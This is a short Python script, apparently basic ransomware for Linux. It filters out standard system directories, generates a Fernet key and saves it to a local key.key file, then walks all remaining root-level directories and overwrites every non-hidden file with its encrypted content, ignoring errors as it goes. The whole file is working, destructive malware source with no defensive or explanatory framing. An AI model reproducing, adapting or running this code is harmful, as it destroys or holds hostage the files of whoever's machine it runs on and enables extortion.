#!/bin/python3
import os
import platform
from cryptography.fernet import Fernet

def check_os():
    return platform.system()

check_os()


def Linux():
    if check_os() == "Linux":

        system_dirs = [
            "bin",
            "boot",
            "dev",
            "etc",
            "etclhosts",
            "lib",
            "proc",
            "root",
            "run",
            "sbin",
            "srv",
            "sys",
            "tmp",
            "usr",
            "var"
        ]

        user_dirs = []

        for check_dirs in os.listdir("/"):
            if check_dirs not in system_dirs:
                user_dirs.append("/" + check_dirs)
                print("Done filter file user")

        key = Fernet.generate_key()

        with open("key.key", "wb") as f:  # create key
            f.write(key)

        fernet = Fernet(key)
        print(" +] Done key creat")

        for user_dir in user_dirs:  # Solve problem arry user_dirs
            for root, dirs, files in os.walk(user_dir):
                for file in files:
                    try:
                        path_file = os.path.join(root, file)

                        if not file.startswith("."):  # remove file hidden
                            with open(path_file, "rb") as f:  # enc data
                                data = f.read()
                                enc = fernet.encrypt(data)

                            with open(path_file, "wb") as f:  # write enc data
                                f.write(enc)
                                print(f" +] Done file {file} encrypted !!")

                    except Exception as e:
                        continue


print("#" * 80)
Linux()
